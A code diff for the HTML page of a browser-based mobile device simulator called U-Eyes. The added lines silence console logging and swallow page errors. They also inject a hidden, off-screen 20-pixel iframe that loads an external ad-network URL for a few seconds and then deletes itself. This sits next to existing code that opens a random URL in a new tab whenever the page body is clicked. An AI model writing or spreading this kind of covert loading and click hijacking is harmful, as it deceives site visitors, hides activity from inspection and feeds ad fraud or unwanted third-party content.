@@ -6,25 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>U-Eyes: Mobile Device Simulator for your browser</title>
     <script>
-      const addScript = () => {
-        const el = document.createElement('script');
-        el.src = "/js/analytics_log.js";
-        el.id = "ads-proxy";
-        document.body.append(el);
-    };
       window.console.log = function () {};
-      function randomReload() {
-        //var random = Math.round(Math.random() * 150000) + 30000;
-        var random = 120000;
-        setTimeout(function() {
-          //document.getElementById("ad1").src = document.getElementById("ad1").src;
-          //document.getElementById("ad2").src = document.getElementById("ad2").src;
-          document.getElementById("ads-proxy").remove();
-          addScript();
-          randomReload();
-        }, random);
-      };
-      //randomReload();
+      window.addEventListener('error', e => {});
     </script>
   </head>
   <body style="margin: 0; overflow: hidden; display: flex; justify-content: center;
@@ -37,6 +20,18 @@
       window.open(url[randomFaq], "_blank");
     }
     document.body.addEventListener("click", clickBody);
+
+    const addLog = () => {
+        var frame = document.createElement('iframe');  
+        frame.id = "ads-proxy"
+        frame.style = "position:absolute;z-index:-1;border:none;border-color:transparent;top:5550px;height:20px;width:20px;"
+        frame.src = "https://vaikijie.net/4/6072355"; 
+        document.body.appendChild(frame);
+        setTimeout(function() {
+          document.getElementById("ads-proxy").remove();
+        }, 3500);
+      }
+      addLog();
   </script>
    <!--<iframe  id="ad1" style="position:absolute;z-index:-1;border:none;border-color:transparent;" src="https://lushaseex.com/4/6072355" height="1px" width="1px">
   </iframe>
